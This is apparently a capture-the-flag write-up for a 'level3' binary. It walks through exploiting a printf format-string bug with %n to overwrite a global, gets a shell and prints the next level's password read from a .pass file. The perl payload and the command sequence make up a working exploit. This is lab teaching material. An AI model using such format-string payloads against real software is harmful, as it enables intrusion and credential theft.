# level3

we have a program named level3
```bash
> ./level3
text  <- user input
text  <- program output
```

If we disass the program, we see a function `v`.

In this function, there is a fgets call, then a printf of the fgets

After the printf, we have a condition
```
;  address of a constant in the data section
if ds:0x804988c == 64 {
	system("/bin/sh")
}
```

We will use a vulnerability of printf with the `%n` option https://www.exploit-db.com/papers/23985.

The goal is to write the value `64` in the address `0x804988c`.

To do this, we will find the offset of the first argument.
```bash
> for i in {0..100}; do echo "Index: $i" && echo "****%$i\$x" | ./level3 ; done | grep -B1 2a2a
Index: 4
****2a2a2a2a
```
This mean that we can do
```bash
> echo "AAAA %4\$x" | ./level3
AAAA 41414141
```

If we write the address of the variable that we want to change the value (4 char) + 60 random char and the `%n` option, the value `64` will be writed in the address.

Let's try this:
```bash
> perl -e 'print "\x8c\x98\x04\x08" . "A"x60 . "%4\$n"' > /tmp/args
> cat /tmp/args - | ./level3
...
Wait what?!
# this is the /bin/sh
> cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
